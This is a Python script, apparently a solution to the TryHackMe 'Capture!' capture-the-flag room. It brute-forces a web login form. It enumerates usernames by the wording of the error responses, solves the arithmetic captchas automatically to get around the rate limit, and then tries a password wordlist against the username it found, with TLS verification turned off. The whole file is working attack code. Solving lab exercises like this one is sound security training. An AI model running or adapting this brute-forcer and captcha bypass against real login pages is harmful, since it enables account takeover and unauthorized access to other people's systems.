import requests
import sys
import re

# tryhackme Capture! room script

def captcha_value(response):
    try:
        import operator
        #extract captcha value "344 + 45 = ?"
        operation={
        "+":operator.add,
        "-":operator.sub,
        "*":operator.mul,
        "/":operator.truediv
        }
        #get the value of captcha using regex 
        captch=re.search("\d+\s\W\W\d+",response.text).group()
        captch=captch.split(' ')
        #split the value to list
        num1=int(captch[0])
        num2=int(captch[2])
        operators=captch[1]
        #use operator lib to calculate the results
        result=operation[operators](num1,num2)
        if operators=="/":
            return f"{result:,.2f}"
        else:
            return result
            
    except:
        pass
       
def BrCaptcha(session,url):

    print('(+) trying to bypass captcha ........')

    url_login=url+"/login"
    # get password and username 
    with open("usernames.txt","r") as username:
        usernameList=username.readlines()
        username.close()
    with open("passwords.txt","r") as password:
        passwordlist=password.readlines()
        password.close()
    
    ####
    print('(+) Start searching for username ......')
    ###
    ##make many attempts to trigger the captcha
    data_check={"username":"test","password":"test"}
    response_check=session.post(url_login,verify=False,data=data_check)
    while "Captcha enabled" not in response_check.text:
        response_check=session.post(url_login,verify=False,data=data_check)
    ########
    #set captcha to value to start with
    value_captcha=0
    #loop the username list to test each username
    for i in usernameList:
        data={"username":i.strip(),"password":"test","captcha":value_captcha}
        #send the a post requests
        response_username=session.post(url_login,verify=False,data=data)
       
        #check if the response containe the word captcha enable 
        if "Captcha enabled" in response_username.text:
            #after we know we send the response the function captcha value to calculate it and return it
            value_captcha=captcha_value(response_username)
            #if word Invalid password in response so we got the name
            if "Invalid password for user"  in response_username.text:
                print('(+) Username Found : %s '%i.strip())
                #now testing the password with the usename that we found
                print('(+) Start searching for password ......')
                value_captcha_ps=0
                #loop the password list 
                for ps in passwordlist:
                    data_ps={"username":i.strip(),"password":ps.strip(),"captcha":value_captcha_ps}
                    response_password=session.post(url_login,verify=False,data=data_ps)
                    value_captcha_ps=captcha_value(response_password)
                    # if we got flag.txt in response so we found password 
                    if "Flag.txt"  in response_password.text:
                        print('(+) Password found : %s '%ps.strip())
                        #extract the flag using regx
                        falg=re.findall("[^</>h][a-z1-9]+",response_password.text)
                        print("(+) "+falg[0]+":"+falg[2]+falg[3])
                        print('(+) Done . ')
                        sys.exit(-1)
                    else:
                        pass          
        else:
            pass

def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s http://IP'%sys.argv[0])
        exit(-1)
    url=sys.argv[1]
    session=requests.session()
    BrCaptcha(session,url)

if __name__=="__main__":
    main()
